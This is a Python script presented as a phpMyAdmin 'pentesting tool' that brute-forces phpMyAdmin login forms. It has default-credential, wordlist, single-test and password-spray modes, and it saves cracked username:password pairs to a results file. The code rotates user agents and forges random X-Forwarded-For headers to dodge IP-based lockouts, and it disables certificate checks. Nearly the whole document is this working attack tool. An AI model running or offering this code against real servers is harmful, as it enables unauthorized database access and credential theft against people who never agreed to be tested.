#!/usr/bin/env python3
# Author: HackFut - phpMyAdmin Authentication Tester
# Version: 4.0 (Enterprise Edition)

import requests
import random
import os
import sys
import time
import json
from datetime import datetime
from time import sleep
from colorama import Fore, Style, init
import socket
import threading
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colors
init(autoreset=True)

# Configuration
CONFIG = {
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
    ],
    "default_users": ["root", "admin", "pma", "mysql", "test", "user"],
    "default_passwords": ["", "root", "admin", "password", "123456", "toor", "mysql"],
    "timeout": 15,
    "delay": 1.5,
    "max_threads": 5,
    "results_file": "scan_results.json",
    "proxy": None  # Example: {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
}

# Banner
BANNER = f"""
{Fore.CYAN}
██████╗ ██╗  ██╗██╗   ██╗███╗   ███╗ █████╗ ██████╗ ███╗   ██╗
██╔══██╗██║  ██║██║   ██║████╗ ████║██╔══██╗██╔══██╗████╗  ██║
██████╔╝███████║██║   ██║██╔████╔██║███████║██████╔╝██╔██╗ ██║
██╔═══╝ ██╔══██║██║   ██║██║╚██╔╝██║██╔══██║██╔══██╗██║╚██╗██║
██║     ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║  ██║██║ ╚████║
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
{Style.RESET_ALL}
{Fore.YELLOW}>>> phpMyAdmin Enterprise Pentesting Tool v4.0 <<<
{Fore.MAGENTA}>>> Developed by HackFut Security Research Team <<<
{Style.RESET_ALL}
"""

class BruteForceEngine:
    def __init__(self, target_url):
        self.target_url = target_url
        self.found_credentials = []
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.session = requests.Session()
        self.session.proxies = CONFIG["proxy"]
        self.session.verify = False  # For testing purposes only
        
    def test_credentials(self, username, password):
        if self.stop_event.is_set():
            return False
            
        headers = {
            "User-Agent": random.choice(CONFIG["user_agents"]),
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": socket.inet_ntoa(bytes(map(int, f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}".split("."))))
        }
        
        payload = {
            "pma_username": username,
            "pma_password": password,
            "server": "1"
        }
        
        try:
            start_time = time.time()
            response = self.session.post(
                self.target_url,
                headers=headers,
                data=payload,
                allow_redirects=False,
                timeout=CONFIG["timeout"]
            )
            response_time = time.time() - start_time
            
            if "main.php" in response.headers.get("Location", ""):
                with self.lock:
                    self.found_credentials.append((username, password))
                    print(f"{Fore.GREEN}[+] SUCCESS: {username}:{password} (Response: {response_time:.2f}s){Style.RESET_ALL}")
                    self.save_results()
                    return True
                    
            print(f"{Fore.RED}[-] FAILED: {username}:{password} (Response: {response_time:.2f}s){Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.YELLOW}[!] ERROR: {username}:{password} ({str(e)}){Style.RESET_ALL}")
            
        sleep(CONFIG["delay"])
        return False
        
    def save_results(self):
        try:
            with open(CONFIG["results_file"], "w") as f:
                json.dump({
                    "target": self.target_url,
                    "timestamp": datetime.now().isoformat(),
                    "credentials": self.found_credentials
                }, f, indent=4)
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to save results: {str(e)}{Style.RESET_ALL}")

def load_wordlist(filename):
    try:
        with open(filename, "r", encoding="latin-1") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Fore.RED}[!] Error loading {filename}: {str(e)}{Style.RESET_ALL}")
        return []

def run_default_scan(engine):
    print(f"\n{Fore.MAGENTA}[*] Testing default credentials ({len(CONFIG['default_users'])} users × {len(CONFIG['default_passwords'])} passwords)...{Style.RESET_ALL}")
    for user in CONFIG["default_users"]:
        for pwd in CONFIG["default_passwords"]:
            if engine.test_credentials(user, pwd):
                return

def run_custom_scan(engine, users, passwords):
    print(f"\n{Fore.MAGENTA}[*] Testing {len(users)} users × {len(passwords)} passwords...{Style.RESET_ALL}")
    for user in users:
        for pwd in passwords:
            if engine.test_credentials(user, pwd):
                return

def run_single_test(engine):
    user = input(f"{Fore.BLUE}[?] Username: {Style.RESET_ALL}").strip()
    pwd = input(f"{Fore.BLUE}[?] Password: {Style.RESET_ALL}").strip()
    engine.test_credentials(user, pwd)

def run_password_spray(engine):
    user = input(f"{Fore.BLUE}[?] Target username: {Style.RESET_ALL}").strip()
    pass_file = input(f"{Fore.BLUE}[?] Password wordlist: {Style.RESET_ALL}").strip()
    passwords = load_wordlist(pass_file)
    
    if passwords:
        print(f"\n{Fore.MAGENTA}[*] Testing {user} against {len(passwords)} passwords...{Style.RESET_ALL}")
        for pwd in passwords:
            if engine.test_credentials(user, pwd):
                return

def main():
    clear_terminal()
    print(BANNER)
    
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = input(f"{Fore.BLUE}[?] phpMyAdmin URL (e.g., http://10.0.0.1/phpmyadmin/): {Style.RESET_ALL}").strip()
    
    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"
    
    engine = BruteForceEngine(target_url)
    
    print(f"\n{Fore.CYAN}Available Modes:{Style.RESET_ALL}")
    print("1. Default Credential Scan")
    print("2. Custom Wordlist Attack")
    print("3. Single Credential Test")
    print("4. Password Spray Attack")
    print("5. Exit")
    
    try:
        choice = input(f"\n{Fore.BLUE}[?] Select mode (1-5): {Style.RESET_ALL}").strip()
        
        if choice == "1":
            run_default_scan(engine)
        elif choice == "2":
            user_file = input(f"{Fore.BLUE}[?] Username wordlist: {Style.RESET_ALL}").strip()
            pass_file = input(f"{Fore.BLUE}[?] Password wordlist: {Style.RESET_ALL}").strip()
            users = load_wordlist(user_file)
            passwords = load_wordlist(pass_file)
            if users and passwords:
                run_custom_scan(engine, users, passwords)
        elif choice == "3":
            run_single_test(engine)
        elif choice == "4":
            run_password_spray(engine)
        elif choice == "5":
            sys.exit(0)
        else:
            print(f"{Fore.RED}[!] Invalid choice!{Style.RESET_ALL}")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
    finally:
        if engine.found_credentials:
            print(f"\n{Fore.GREEN}[+] Found credentials saved to {CONFIG['results_file']}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[-] No valid credentials found{Style.RESET_ALL}")

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    main()
